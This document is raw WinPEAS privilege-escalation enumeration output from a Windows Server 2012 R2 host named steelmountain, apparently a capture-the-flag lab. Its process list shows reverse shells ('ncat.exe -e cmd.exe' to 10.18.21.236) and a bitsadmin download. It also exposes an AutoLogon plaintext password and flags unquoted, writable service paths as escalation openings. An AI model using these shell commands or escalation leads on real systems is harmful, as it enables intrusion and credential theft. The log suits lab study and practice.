
```sh
C:\Users\bill\Desktop>winpeas    
winpeas
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((                                                                               
        (((((((((((((((((((((((((((((((((((((((((((                                                                           
      ((((((((((((((**********/##########(((((((((((((                                                                        
    ((((((((((((********************/#######(((((((((((                                                                       
    ((((((((******************/@@@@@/****######((((((((((                                                                     
    ((((((********************@@@@@@@@@@/***,####((((((((((                                                                   
    (((((********************/@@@@@%@@@@/********##(((((((((                                                                  
    (((############*********/%@@@@@@@@@/************((((((((                                                                  
    ((##################(/******/@@@@@/***************((((((                                                                  
    ((#########################(/**********************(((((                                                                  
    ((##############################(/*****************(((((                                                                  
    ((###################################(/************(((((                                                                  
    ((#######################################(*********(((((                                                                  
    ((#######(,.***.,(###################(..***.*******(((((                                                                  
    ((#######*(#####((##################((######/(*****(((((                                                                  
    ((###################(/***********(##############()(((((                                                                  
    (((#####################/*******(################)((((((                                                                  
    ((((############################################)((((((                                                                   
    (((((##########################################)(((((((                                                                   
    ((((((########################################)(((((((                                                                    
    ((((((((####################################)((((((((                                                                     
    (((((((((#################################)(((((((((                                                                      
        ((((((((((##########################)(((((((((                                                                        
              ((((((((((((((((((((((((((((((((((((((                                                                          
                 ((((((((((((((((((((((((((((((                                                                               

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.                                                                                                         
                                                                                                                              
  WinPEAS-ng by @hacktricks_live                                                                                              

       /---------------------------------------------------------------------------------\                                    
       |                             Do you like PEASS?                                  |                                    
       |---------------------------------------------------------------------------------|                                    
       |         Follow on Twitter         :     @hacktricks_live                        |                                    
       |         Respect on HTB            :     SirBroccoli                             |                                    
       |---------------------------------------------------------------------------------|                                    
       |                                 Thank you!                                      |                                    
       \---------------------------------------------------------------------------------/                                    
                                                                                                                              
  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation                                                                                                                       
   Creating Dynamic lists, this could take a while, please wait...                                                            
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list (local only)...
   - Creating disabled users list...
   - Admin users list...
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


�����������������������������������͹ System Information �������������������������������������

����������͹ Basic System Information
� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits                                                                                        
    OS Name: Microsoft Windows Server 2012 R2 Datacenter
    OS Version: 6.3.9600 N/A Build 9600
    System Type: x64-based PC
    Hostname: steelmountain
    ProductName: Windows Server 2012 R2 Datacenter
    EditionID: ServerDatacenter
    ReleaseId: 
    BuildBranch: 
    CurrentMajorVersionNumber: 
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 1
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: False
    Current Time: 4/23/2024 6:49:17 AM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: KB2919355, KB2919442, KB2937220, KB2938772, KB2939471, KB2949621, 

  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)

����������͹ Showing All Microsoft Updates
  [X] Exception: Exception has been thrown by the target of an invocation.

����������͹ System Last Shutdown Date/time (from Registry)
                                                                                                                              
    Last Shutdown Date/time        :    10/12/2020 12:12:51 PM

����������͹ User Environment Variables
� Check for some passwords or keys in the env variables 
    COMPUTERNAME: STEELMOUNTAIN
    USERPROFILE: C:\Users\bill
    HOMEPATH: \Users\bill
    LOCALAPPDATA: C:\Users\bill\AppData\Local
    PSModulePath: C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
    PROCESSOR_ARCHITECTURE: AMD64
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    NCAT_REMOTE_PORT: 443
    LOGONSERVER: \\STEELMOUNTAIN
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    HOMEDRIVE: C:
    NCAT_REMOTE_ADDR: 10.18.21.236
    SESSIONNAME: Console
    NCAT_PROTO: TCP
    SystemDrive: C:
    PUBLIC: C:\Users\Public
    FP_NO_HOST_CHECK: NO
    APPDATA: C:\Users\bill\AppData\Roaming
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
    USERNAME: bill
    TEMP: C:\Users\bill\AppData\Local\Temp\1
    SystemRoot: C:\Windows
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    USERDOMAIN_ROAMINGPROFILE: STEELMOUNTAIN
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    NCAT_LOCAL_ADDR: 10.10.175.80
    PROMPT: $P$G
    ALLUSERSPROFILE: C:\ProgramData
    NCAT_LOCAL_PORT: 49407
    USERDOMAIN: STEELMOUNTAIN
    ProgramFiles: C:\Program Files
    NUMBER_OF_PROCESSORS: 1
    ComSpec: C:\Windows\system32\cmd.exe
    TMP: C:\Users\bill\AppData\Local\Temp\1
    ProgramData: C:\ProgramData
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    PROCESSOR_REVISION: 4f01

����������͹ System Environment Variables
� Check for some passwords or keys in the env variables 
    FP_NO_HOST_CHECK: NO
    USERNAME: SYSTEM
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
    ComSpec: C:\Windows\system32\cmd.exe
    TMP: C:\Windows\TEMP
    OS: Windows_NT
    windir: C:\Windows
    PROCESSOR_ARCHITECTURE: AMD64
    TEMP: C:\Windows\TEMP
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PSModulePath: C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
    NUMBER_OF_PROCESSORS: 1
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    PROCESSOR_REVISION: 4f01

����������͹ Audit Settings
� Check what is being logged 
    Not Found

����������͹ Audit Policy Settings - Classic & Advanced

����������͹ WEF Settings
� Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

����������͹ LAPS Settings
� If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

����������͹ Wdigest
� If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#wdigest                                                                                                   
    Wdigest is not enabled

����������͹ LSA Protection
� If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#lsa-protection          
    LSA Protection is not enabled

����������͹ Credentials Guard
� If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#credential-guard                                                                                           
    CredentialGuard is not enabled
  [X] Exception:   [X] 'Win32_DeviceGuard' WMI class unavailable

����������͹ Cached Creds
� If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#cached-credentials                                                            
    cachedlogonscount is 10

����������͹ Enumerating saved credentials in Registry (CurrentPass)

����������͹ AV Information
  [X] Exception: Invalid namespace 
    No AV was detected!!
    Not Found

����������͹ Windows Defender configuration
  Local Settings
  Group Policy Settings

����������͹ UAC Status
� If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access                                                              
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken: 0
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.                                              

����������͹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 4.0
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: 
    PS history size: 

����������͹ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

����������͹ PS default transcripts history
� Read the PS history inside these files (if any)

����������͹ HKCU Internet Settings
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    IE5_UA_Backup_Flag: 5.0
    ZonesSecurityUpgrade: System.Byte[]
    EmailName: User@
    AutoConfigProxy: wininet.dll
    MimeExclusionListForCache: multipart/mixed multipart/x-mixed-replace multipart/x-byteranges 
    WarnOnPost: System.Byte[]
    UseSchannelDirectly: System.Byte[]
    EnableHttp1_1: 1
    UrlEncoding: 0
    SecureProtocols: 2720
    PrivacyAdvanced: 0
    DisableCachingOfSSLPages: 1
    WarnonZoneCrossing: 1
    CertificateRevocation: 1
    EnableNegotiate: 1
    MigrateProxy: 1
    ProxyEnable: 0

����������͹ HKLM Internet Settings
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    WarnOnIntranet: 1
    MinorVersion: 0
    ActiveXCache: C:\Windows\Downloaded Program Files

����������͹ Drives Information
� Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 41 GB)(Permissions: Users [AppendData/CreateDirectories])

����������͹ Checking WSUS
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
    Not Found

����������͹ Checking KrbRelayUp
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup
  The system isn't inside a domain, so it isn't vulnerable

����������͹ Checking If Inside Container
� If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container

����������͹ Checking AlwaysInstallElevated
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated isn't available

����������͹ Enumerate LSA settings - auth packages included
                                                                                                                              
    Bounds                               :       00-30-00-00-00-20-00-00
    auditbasedirectories                 :       0
    fullprivilegeauditing                :       00
    crashonauditfail                     :       0
    auditbaseobjects                     :       0
    Security Packages                    :       ""
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Notification Packages                :       rassfm,scecli
    Authentication Packages              :       msv1_0
    LsaPid                               :       648
    SecureBoot                           :       1
    ProductType                          :       8
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1

����������͹ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)
                                                                                                                              

  NTLM Signing Settings                                                                                                       
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security                                                                                                            
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)
                                                                                                                              

  NTLM Auditing and Restrictions                                                                                              
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 

����������͹ Display Local Group Policy settings - local users/machine

����������͹ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



����������͹ Enumerating Printers (WMI)
      Name:                    Microsoft XPS Document Writer
      Status:                  Unknown
      Sddl:                    O:SYD:(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)
      Is default:              True
      Is network printer:      False

   =================================================================================================


����������͹ Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  datastate_{CBADF67E-A2FC-4CB1-832B-B8CA731D66A3}\BPSvc8                                              Everyone [AllAccess]                                                   O:BAG:SY

  datastate_{CBADF67E-A2FC-4CB1-832B-B8CA731D66A3}\BPSvc9                                              Everyone [AllAccess]                                                   O:BAG:SY

  datastate_ProgramDeactivator_DisableRuningProgram_V9                                                 Everyone [AllAccess]                                                   O:BAG:SY

  datastate_ProgramDeactivator_PIPE_NAME_V9                                                            Everyone [AllAccess]                                                   O:BAG:SY

  eventlog                                                                                             Everyone [WriteData/CreateFiles]                                       O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)


����������͹ Enumerating AMSI registered providers

����������͹ Enumerating Sysmon configuration
      You must be an administrator to run this check

����������͹ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

����������͹ Installed .NET versions
                                                                                                                              
  CLR Versions
   4.0.30319

  .NET Versions                                                                                                               
   4.5.51641

  .NET & AMSI (Anti-Malware Scan Interface) support                                                                           
      .NET version supports AMSI     : False
      OS supports AMSI               : False


�����������������������������������͹ Interesting Events information �������������������������������������

����������͹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials
                                                                                                                              
      You must be an administrator to run this check

����������͹ Printing Account Logon Events (4624) for the last 10 days.
                                                                                                                              
      You must be an administrator to run this check

����������͹ Process creation events - searching logs (EID 4688) for sensitive data.
                                                                                                                              
      You must be an administrator to run this check

����������͹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.
                                                                                                                              

����������͹ Displaying Power off/on events for last 5 days
                                                                                                                              
  4/23/2024 4:16:55 AM    :  Startup


�����������������������������������͹ Users Information �������������������������������������

����������͹ Users
� Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups                                                                                                      
  Current user: bill
  Current groups: Domain Users, Everyone, Users, Interactive, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
   =================================================================================================

    STEELMOUNTAIN\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-Expi-Req

    STEELMOUNTAIN\bill
        |->Groups: Users
        |->Password: CanChange-NotExpi-Req

    STEELMOUNTAIN\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq


����������͹ Current User Idle Time
   Current User   :     STEELMOUNTAIN\bill
   Idle Time      :     02h:32m:23s:046ms

����������͹ Display Tenant information (DsRegCmd.exe /status)

����������͹ Current Token privileges
� Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation                                                                                          
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED

����������͹ Clipboard text

����������͹ Logged users
    STEELMOUNTAIN\bill

����������͹ Display information about local users
   Computer Name           :   STEELMOUNTAIN
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   10/12/2020 12:11:57 PM
   Logons Count            :   19
   Password Last Set       :   9/27/2019 6:17:19 AM

   =================================================================================================

   Computer Name           :   STEELMOUNTAIN
   User Name               :   bill
   User Id                 :   1001
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   
   Last Logon              :   4/23/2024 4:17:54 AM
   Logons Count            :   74
   Password Last Set       :   9/26/2019 11:26:45 PM

   =================================================================================================

   Computer Name           :   STEELMOUNTAIN
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================


����������͹ RDP Sessions
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    1         Console        bill           STEELMOUNTAIN            Active    

����������͹ Ever logged users
    STEELMOUNTAIN\Administrator
    STEELMOUNTAIN\bill

����������͹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\bill : bill [AllAccess]
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public : Interactive [WriteData/CreateFiles]

����������͹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  bill
    DefaultPassword               :  PMBAf5KhZAxVhvqb

����������͹ Password Policies
� Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: STEELMOUNTAIN
    SID: S-1-5-21-3029548963-3893655183-1231094572
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: DOMAIN_PASSWORD_COMPLEX
   =================================================================================================


����������͹ Print Logon Sessions
    Method:                       WMI
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     148909
    Logon Time:                   
    Logon Type:                   0
    Start Time:                   12/31/1600 4:00:00 PM
    Domain:                       STEELMOUNTAIN
    Authentication Package:       
    Start Time:                   12/31/1600 4:00:00 PM
    User Name:                    bill
    User Principal Name:          
    User SID:                     

   =================================================================================================



�����������������������������������͹ Processes Information �������������������������������������

����������͹ Interesting Processes -non Microsoft-
� Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes                                                       
    conhost(2344)[C:\Windows\system32\conhost.exe] -- POwn: bill
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    taskhostex(2476)[C:\Windows\system32\taskhostex.exe] -- POwn: bill
    Command Line: taskhostex.exe 
   =================================================================================================                          

    explorer(2544)[C:\Windows\Explorer.EXE] -- POwn: bill
    Command Line: C:\Windows\Explorer.EXE
   =================================================================================================                          

    ncat(1112)[C:\Users\Public\ncat.exe] -- POwn: bill
    Permissions: bill [AllAccess], Interactive [WriteData/CreateFiles]
    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
    Command Line: "C:\Users\Public\ncat.exe" -e cmd.exe 10.18.21.236 444
   =================================================================================================                          

    cmd(2260)[C:\Windows\SysWOW64\cmd.exe] -- POwn: bill
    Command Line: cmd.exe
   =================================================================================================                          

    conhost(2852)[C:\Windows\system32\conhost.exe] -- POwn: bill
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    bitsadmin(436)[C:\Windows\SysWOW64\bitsadmin.exe] -- POwn: bill
    Command Line: bitsadmin  /transfer myDownloadJob /download /priority normal https://github.com/peass-ng/PEASS-ng/releases/download/20240421-825f642d/winPEASx86.exe C:\Users\bill\Desktop\winpeas.exe                                                   
   =================================================================================================                          

    hfs(468)[C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe] -- POwn: bill
    Permissions: bill [AllAccess]
    Possible DLL Hijacking folder: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup (bill [AllAccess])                                                                                                                           
    Command Line: "C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe" 
   =================================================================================================                          

    conhost(1888)[C:\Windows\system32\conhost.exe] -- POwn: bill
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    cmd(2328)[C:\Windows\SysWOW64\cmd.exe] -- POwn: bill
    Command Line: cmd.exe
   =================================================================================================                          

    powershell(2560)[C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe] -- POwn: bill
    Command Line: powershell
   =================================================================================================                          

    ncat(2948)[C:\Users\Public\ncat.exe] -- POwn: bill
    Permissions: bill [AllAccess], Interactive [WriteData/CreateFiles]
    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
    Command Line: "C:\Users\Public\ncat.exe" -e cmd.exe 10.18.21.236 443
   =================================================================================================                          

    winpeas(2324)[C:\Users\bill\Desktop\winpeas.exe] -- POwn: bill -- isDotNet
    Permissions: bill [AllAccess]
    Possible DLL Hijacking folder: C:\Users\bill\Desktop (bill [AllAccess])
    Command Line: winpeas
   =================================================================================================                          

    conhost(2584)[C:\Windows\system32\conhost.exe] -- POwn: bill
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================


����������͹ Vulnerable Leaked Handlers
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation
� Getting Leaked Handlers, it might take some time...


�����������������������������������͹ Services Information �������������������������������������

����������͹ Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                        
    AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected                                                                      
    File Permissions: bill [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
    Advanced SystemCare Service
   =================================================================================================                          

    AmazonSSMAgent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Auto - Running
    Amazon SSM Agent
   =================================================================================================                          

    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected                                                                                                        
    AWS Lite Guest Agent
   =================================================================================================                          

    Ec2Config(Amazon Web Services, Inc. - Ec2Config)["C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe"] - Auto - Running - isDotNet
    Ec2 Configuration Service
   =================================================================================================                          

    IObitUnSvr(IObit - IObit Uninstaller Service)[C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe] - Auto - Stopped - No quotes and Space detected
    File Permissions: bill [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\IObit Uninstaller (bill [WriteData/CreateFiles])
    IObit Uninstaller Service
   =================================================================================================                          

    LiveUpdateSvc(IObit - LiveUpdate)[C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe] - Auto - Running - No quotes and Space detected                                                                                                               
    File Permissions: bill [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\LiveUpdate (bill [WriteData/CreateFiles])
    LiveUpdate
   =================================================================================================                          

    PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped
   =================================================================================================


����������͹ Modifiable Services
� Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                                                                                             
    You cannot modify any service

����������͹ Looking if you can modify any service registry
� Check if you can modify the registry of a service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-permissions                                                                                          
    [-] Looks like you cannot change the registry of any service...

����������͹ Checking write permissions in PATH folders (DLL Hijacking)
� Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking                                                                                                                    
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\


�����������������������������������͹ Applications Information �������������������������������������

����������͹ Current Active Window Application
    C:\Users\Public\ncat.exe - winpeas
    File Permissions: bill [AllAccess],Interactive [WriteData/CreateFiles]
    Possible DLL Hijacking, folder is writable: C:\Users\Public
    Folder Permissions: bill [AllAccess],Interactive [WriteData/CreateFiles]

����������͹ Installed Applications --Via Program Files/Uninstall registry--
� Check if you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software                                                                                                                      
    C:\Program Files\Amazon
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\Internet Explorer
    C:\Program Files\Uninstall Information
    C:\Program Files\Windows Mail
    C:\Program Files\Windows NT
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


����������͹ Autorun Applications
� Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                                                                  

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


